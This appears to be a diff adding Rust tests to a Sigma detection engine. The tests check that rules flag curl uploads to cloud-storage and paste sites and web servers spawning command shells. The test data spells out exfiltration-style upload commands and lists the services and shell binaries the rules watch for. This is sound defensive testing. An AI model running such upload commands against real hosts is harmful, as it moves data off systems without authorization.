@@ -233,6 +233,105 @@ fn a_samples_file_with_an_unknown_field_or_a_missing_half_is_refused() {
     assert!(load_samples(&rule).is_ok());
 }
 
+/// The storage and paste rules' domain lists and upload shapes (#380, T1567): the samples file holds
+/// one pair per rule, which cannot show every listed name or shape. Each row is a command line
+/// and the rule file it must (or must not) raise.
+#[test]
+fn the_storage_and_paste_rules_cover_each_listed_domain_and_upload_shape() {
+    let engine = SigmaEngine::load_dir(&content_dir()).unwrap();
+    let storage = "Linux curl uploads a file to a cloud storage endpoint";
+    let paste = "Linux curl uploads a file to a paste service";
+    let fires = |title: &str, cmdline: &str| {
+        let event = ExecEvent {
+            image_path: "/usr/bin/curl".to_string(),
+            cmdline: cmdline.to_string(),
+            ..schema::fixtures::exec()
+        };
+        engine.eval_exec(&event).iter().any(|a| a.title == title)
+    };
+    for host in [
+        "drive.google.com",
+        "storage.googleapis.com",
+        "content.dropboxapi.com",
+        "www.dropbox.com",
+        "dl.dropboxusercontent.com",
+        "acct.blob.core.windows.net",
+        "acme.sharepoint.com",
+        "onedrive.live.com",
+        "1drv.ms",
+        "upload.box.com",
+        "box.com",
+        "mega.nz",
+        "wetransfer.com",
+        "transfer.sh",
+        "file.io",
+        "gofile.io",
+        "anonfiles.com",
+        "catbox.moe",
+        "0x0.st",
+        "bucket.s3.amazonaws.com",
+    ] {
+        assert!(
+            fires(storage, &format!("curl -T /tmp/a.tgz https://{host}/up")),
+            "{host}"
+        );
+        assert!(
+            !fires(paste, &format!("curl -T /tmp/a.tgz https://{host}/up")),
+            "{host}"
+        );
+    }
+    for host in [
+        "pastebin.com",
+        "paste.ee",
+        "hastebin.com",
+        "rentry.co",
+        "controlc.com",
+        "dpaste.com",
+        "dpaste.org",
+        "ix.io",
+        "termbin.com",
+        "justpaste.it",
+        "privatebin.net",
+    ] {
+        assert!(
+            fires(paste, &format!("curl -T /tmp/a.txt https://{host}/up")),
+            "{host}"
+        );
+        assert!(
+            !fires(storage, &format!("curl -T /tmp/a.txt https://{host}/up")),
+            "{host}"
+        );
+    }
+    for shape in [
+        "--upload-file /tmp/a",
+        "-T /tmp/a",
+        "-F file=@/tmp/a",
+        "--form file=@/tmp/a",
+        "-d @/tmp/a",
+        "--data @/tmp/a",
+        "--data-binary @/tmp/a",
+    ] {
+        assert!(
+            fires(storage, &format!("curl {shape} https://mega.nz/up")),
+            "{shape}"
+        );
+        assert!(
+            fires(paste, &format!("curl {shape} https://pastebin.com/up")),
+            "{shape}"
+        );
+    }
+    // A host that merely contains a listed name as a substring, and a request without an upload.
+    for cmdline in [
+        "curl -T /tmp/a https://sandbox.com/up",
+        "curl -T /tmp/a https://profile.io/up",
+        "curl -s https://mega.nz/file/abc",
+        "curl -d name=x https://mega.nz/api",
+    ] {
+        assert!(!fires(storage, cmdline), "{cmdline}");
+    }
+    assert!(!fires(paste, "curl -d name=x https://pastebin.com/api"));
+}
+
 #[test]
 fn the_local_and_remote_shell_service_rules_split_on_the_unc_argument() {
     const LOCAL: &str = "Service created with a command-shell binary path";
@@ -274,4 +373,98 @@ fn the_local_and_remote_shell_service_rules_split_on_the_unc_argument() {
         assert!(remote.iter().any(|t| t == LOCAL), "{launcher}: {remote:?}");
         assert!(remote.iter().any(|t| t == REMOTE), "{launcher}: {remote:?}");
     }
+}
+
+/// Titles raised for an exec of `image` under `parent` (`None` = the sensor gave no lineage).
+fn titles_for(engine: &SigmaEngine, parent: Option<&str>, image: &str) -> Vec<String> {
+    let sample = Sample {
+        image: image.into(),
+        cmdline: "x".into(),
+        parentimage: parent.map(Into::into),
+        note: None,
+    };
+    engine
+        .eval_exec(&exec(&sample))
+        .into_iter()
+        .map(|alert| alert.title)
+        .collect()
+}
+
+#[test]
+fn the_web_server_lineage_rules_cover_every_listed_parent_and_interpreter() {
+    const WINDOWS: &str = "Web server or application server spawned a command interpreter";
+    const MACOS: &str = "Web server spawned a shell on macOS";
+    let engine = SigmaEngine::load_dir(&content_dir()).unwrap();
+    for parent in [
+        "httpd.exe",
+        "nginx.exe",
+        "php-cgi.exe",
+        "tomcat8.exe",
+        "tomcat9.exe",
+        "tomcat10.exe",
+        "tomcat11.exe",
+    ] {
+        for interpreter in [
+            "cmd.exe",
+            "powershell.exe",
+            "pwsh.exe",
+            "wscript.exe",
+            "cscript.exe",
+        ] {
+            let hits = titles_for(
+                &engine,
+                Some(&format!(r"C:\srv\bin\{parent}")),
+                &format!(r"C:\Windows\System32\{interpreter}"),
+            );
+            assert!(
+                hits.iter().any(|t| t == WINDOWS),
+                "{parent} -> {interpreter}"
+            );
+        }
+    }
+    for parent in ["httpd", "nginx", "php-fpm"] {
+        for shell in ["sh", "bash", "zsh", "dash"] {
+            let hits = titles_for(
+                &engine,
+                Some(&format!("/usr/local/sbin/{parent}")),
+                &format!("/bin/{shell}"),
+            );
+            assert!(hits.iter().any(|t| t == MACOS), "{parent} -> {shell}");
+        }
+    }
+}
+
+#[test]
+fn the_web_server_lineage_rules_ignore_lookalikes_and_a_missing_lineage() {
+    const WINDOWS: &str = "Web server or application server spawned a command interpreter";
+    const MACOS: &str = "Web server spawned a shell on macOS";
+    let engine = SigmaEngine::load_dir(&content_dir()).unwrap();
+    let silent = |parent: Option<&str>, image: &str| {
+        let hits = titles_for(&engine, parent, image);
+        assert!(
+            !hits.iter().any(|t| t == WINDOWS || t == MACOS),
+            "{parent:?} -> {image}: {hits:?}"
+        );
+    };
+    // The parent is the condition: a name that only ends like a server's does not count.
+    silent(
+        Some(r"C:\tools\myhttpd.exe"),
+        r"C:\Windows\System32\cmd.exe",
+    );
+    silent(
+        Some(r"C:\srv\httpd.exe.bak"),
+        r"C:\Windows\System32\cmd.exe",
+    );
+    silent(Some("/opt/bin/myhttpd"), "/bin/sh");
+    silent(Some("/opt/bin/nginx-helper"), "/bin/sh");
+    // No lineage from the sensor: the rule cannot match, it never guesses.
+    silent(None, r"C:\Windows\System32\cmd.exe");
+    silent(None, "/bin/sh");
+    // A server starting something that is not an interpreter or a shell (a worker, a script
+    // interpreter run on purpose is the Linux rule's business, not these).
+    silent(Some(r"C:\srv\httpd.exe"), r"C:\srv\httpd.exe");
+    silent(Some("/usr/sbin/httpd"), "/usr/sbin/httpd");
+    // An interpreter whose name only ends like one.
+    silent(Some(r"C:\srv\httpd.exe"), r"C:\tools\mycmd.exe");
+    silent(Some("/usr/sbin/httpd"), "/usr/bin/ssh");
 }
